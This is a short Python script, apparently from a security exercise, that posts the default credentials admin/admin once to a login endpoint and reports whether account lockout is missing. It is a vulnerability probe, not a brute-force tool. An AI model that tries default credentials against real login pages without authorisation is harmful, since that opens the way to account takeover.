#Author: Judene Brown
#Vulnerbility: Multiple Login Attempts 
#Target: login.0x10.cloud

import urllib.request
import urllib.parse
import json
import time 

target = "https://login.0x10.cloud/"

data = urllib.parse.urlencode({"username": "admin", "password": "admin"}).encode()

req = urllib.request.Request(target, data=data, method="POST")
req.add_header("Content-Type", "application/x-www-form-urlencoded")

try:
    response = urllib.request.urlopen(req, timeout=5)
    body = json.loads(response.read().decode())

    print(f"Status: {body.get('status')}")
    print(f"Message: {body.get('message')}")
    print(f"Attempts: {body.get('attempts')}")

    if body.get("attempts") == "unlimited":
        print("VULNERABILITY: No account lockout on login.0x10.cloud!")
        print("Attackers can brute force passwords with no limit.")

except Exception as e:
    print(f"Error: {e}")

time.sleep(0.15)